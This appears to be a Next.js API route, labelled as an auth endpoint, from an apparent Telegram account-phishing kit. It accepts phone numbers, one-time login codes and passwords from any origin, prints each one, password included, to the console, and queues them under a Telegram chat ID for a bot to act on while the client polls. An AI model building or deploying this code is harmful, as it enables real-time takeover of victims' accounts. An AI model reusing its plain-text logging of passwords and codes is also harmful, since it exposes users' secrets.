import { type NextRequest, NextResponse } from "next/server"
import { storage } from "../storage"

export async function POST(request: NextRequest) {
  try {
    const headers = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    }

    if (request.method === "OPTIONS") {
      return NextResponse.json({}, { headers })
    }

    const body = await request.json()
    const { action, phone, code, password, country, chatId } = body

    console.log(`[AUTH API] ========== ${action?.toUpperCase() || "UNKNOWN"} ==========`)
    console.log(`[AUTH API] Phone:`, phone || "none")
    console.log(`[AUTH API] Code:`, code || "none")
    console.log(`[AUTH API] Password:`, password || "none")

    // 1. Validate chatId
    const finalChatId = chatId || process.env.TELEGRAM_CHAT_ID
    if (!finalChatId) {
      console.error("[AUTH API] No chatId provided")
      return NextResponse.json(
        {
          success: false,
          error: "chatId is required",
        },
        { status: 400, headers },
      )
    }

    let botAction = action
    if (action === "verify_code") {
      botAction = "send_code" // Bot expects send_code, not verify_code
    }

    // 2. Create request data
    const requestData = {
      chatId: String(finalChatId),
      action: botAction || "send_phone",
      phone: phone || null,
      code: code || null,
      password: password || null,
      country: country || null,
      timestamp: new Date().toISOString(),
      processed: false,
      status: "pending",
    }

    // 3. Save to storage
    const requestId = storage.saveRequest(requestData)
    console.log(`[AUTH API] ✅ Created request: ${requestId} (action: ${botAction})`)

    // 4. Return immediately (client will poll check-status)
    return NextResponse.json(
      {
        success: true,
        requestId,
        message: "Request created, bot will process it",
        status: "pending",
      },
      { headers },
    )
  } catch (error) {
    console.error("[AUTH API] ❌ Error:", error)
    return NextResponse.json(
      {
        success: false,
        error: String(error),
      },
      { status: 500, headers: { "Access-Control-Allow-Origin": "*" } },
    )
  }
}
